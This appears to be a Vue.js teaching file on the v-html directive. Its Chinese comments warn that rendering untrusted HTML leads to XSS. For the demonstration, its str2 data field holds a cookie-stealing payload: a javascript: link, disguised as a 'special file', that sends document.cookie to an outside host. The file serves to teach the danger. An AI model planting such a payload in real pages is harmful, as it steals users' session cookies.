<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        v-html指令:
            1.作用:向指定节点中渲染包含htm1结构的内容。
            2.与插值语法的区别:
                (1).v-htm1会替换掉节点中所有的内容，{{xx}}则不会
                (2).v-html可以识别html结构。
            3。严重注意: v-htm1有安全性问题!!!!
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                (2)。一定要在可信的内容上使用v-htm1，永不要用在用户提交的内容上!

     -->
    <div id="root">
        <!-- <h3 v-text="str"></h3> -->
        <h3>{{str}}</h3>
        <h3 v-html="str">6666</h3>
        <h3 v-html="str2"></h3>
    </div>
    <script>
        new Vue({
            el:'#root',
            data:{
                name:'薛仁贵',
                str:'<h3>你好，钟馗</h3>',
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>我有特殊文件</a>',
            }
        })
    </script>
</body>
</html>
